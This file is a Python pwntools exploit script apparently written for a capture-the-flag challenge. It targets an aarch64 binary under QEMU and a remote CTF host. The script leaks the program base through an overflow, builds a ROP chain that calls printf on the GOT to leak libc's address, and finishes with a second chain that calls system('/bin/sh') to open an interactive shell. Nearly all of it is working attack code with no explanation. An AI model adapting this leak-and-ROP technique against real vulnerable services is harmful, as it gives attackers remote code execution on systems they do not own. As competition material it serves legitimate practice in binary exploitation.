#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.zh3r0.cf', 1111
binary = './qemu-aarch64 -g 1234 -nx ./vuln'.split()
brkpts = '''
'''

elf = ELF("vuln")
libc = ELF("./lib/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "aarch64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary)#, env = {'LD_PRELOAD' : './lib/libc.so.6'})

gadget1 = 0x900 # : nop ; ldr x3, [x21, x19, lsl #3] ; mov x2, x24 ; add x19, x19, #1 ; mov x1, x23 ; mov w0, w22 ; blr x3
gadget2 = 0x920 # : ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret

if __name__ == "__main__":
    sla("name: ", "a"*7)
    reu("aaaaaaa\n")
    main = uu64(re(4)) - 0x24
    log.info("main -> "+hex(main))

    code = main - 0x884
    printf_got = code + 0x11030
    printf_plt = code + 0x710
    gadget1 = code + gadget1
    gadget2 = code + gadget2

    payload = "a"*0x28 + p64(main)
    sla("now: ", payload)

    sla("name: ", "")
    reu("Hello, \n")
    stack = uu64("\x0a" + re(5)) + 0x86 + 0xc8

    log.info("Stack -> "+hex(stack))

    sla("now: ", payload)

    sla("name: ", p64(printf_plt))

    payload = "a"*0x28
    payload += flat([
        gadget2, #pc
        0, #x29
        gadget1, #x30
        0, #x19
        1, #x20
        stack, #x21
        printf_got, #x22
        printf_got, #x23
        printf_got, #x24
        main,
        main,
        main,
        main,
        main,
        main,
        main,
        main,
        main,
        main,
        main,
        printf_plt
    ])
    sla("now: ", payload)

    libc.address = uu64(re(4)) - libc.symbols['printf'] 
    log.info("libc -> "+hex(libc.address))

    gadget = libc.address + 0x6288c
    binsh = next(libc.search("/bin/sh"))
    system = libc.symbols['system']

    payload = "a"*0x28
    payload += flat([
        gadget,
        0xdeadbeef,
        system,
        binsh,
        binsh
    ])

    sla("name: ", "")
    sla("now: ", payload)
    
    io.interactive()
